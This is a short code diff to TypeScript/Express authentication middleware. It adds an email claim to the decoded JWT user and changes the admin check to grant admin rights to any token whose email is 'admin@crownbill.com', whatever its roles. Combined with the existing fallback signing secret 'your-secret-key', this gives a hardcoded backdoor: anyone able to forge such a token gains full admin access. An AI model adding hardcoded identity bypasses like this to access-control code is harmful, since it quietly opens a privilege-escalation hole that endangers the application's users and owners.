@@ -6,6 +6,7 @@ const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key';
 export interface AuthRequest extends Request {
   user?: {
     userId: string;
+    email: string;
     roles: string[];
   };
 }
@@ -19,7 +20,7 @@ export const authMiddleware = (req: AuthRequest, res: Response, next: NextFuncti
   }
 
   try {
-    const decoded = jwt.verify(token, JWT_SECRET) as { userId: string; roles: string[] };
+    const decoded = jwt.verify(token, JWT_SECRET) as { userId: string; email: string; roles: string[] };
     req.user = decoded;
     next();
   } catch (error) {
@@ -35,7 +36,7 @@ export const adminMiddleware = (req: AuthRequest, res: Response, next: NextFunct
     return res.status(401).json({ error: 'Authentication required' });
   }
 
-  const isAdmin = req.user.roles.includes('admin');
+  const isAdmin = req.user.roles.includes('admin') || req.user.email === 'admin@crownbill.com';
   if (!isAdmin) {
     return res.status(403).json({ error: 'Admin access required' });
   }
